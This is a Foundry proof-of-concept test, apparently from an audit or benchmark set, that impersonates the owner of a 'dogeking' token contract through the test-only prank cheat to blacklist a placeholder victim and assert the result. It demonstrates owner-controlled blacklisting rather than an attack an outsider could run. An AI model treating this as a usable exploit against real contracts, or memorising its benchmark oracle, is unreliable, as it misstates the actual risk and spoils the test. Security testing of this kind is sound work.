import "forge-std/Test.sol";

interface ICoinToken {
    function EnemyAddress(address account, bool value) external;
    function _isEnemy(address account) external view returns (bool);
    function owner() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA54954bb4E1b35AeE6eB04130CD406340EBA9B4;
    address attacker = address(this);
    ICoinToken target;
    address victim_address;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICoinToken(TARGET);
        vm.label(TARGET, "dogeking Contract");
        victim_address = address(0xdeadbeef);
        vm.label(victim_address, "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = target.owner();
        console.log("Contract owner:", owner);

        // Impersonate the owner
        vm.startPrank(owner);

        // Call EnemyAddress to blacklist the victim
        target.EnemyAddress(victim_address, true);

        // Stop impersonation
        vm.stopPrank();

        // Verify the exploit worked - victim is now blacklisted
        bool isEnemy = target._isEnemy(victim_address);
        console.log("Is victim blacklisted?", isEnemy);

        // Oracle verification: _isEnemy[victim_address] should be true
        assertEq(isEnemy, true, "Victim should be blacklisted");

        // Demonstrate the impact - victim cannot transfer tokens
        // This would revert with "Enemy address" error
        // target.transfer(address(1), 1000); // Would fail
        assertEq(target._isEnemy(victim_address), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

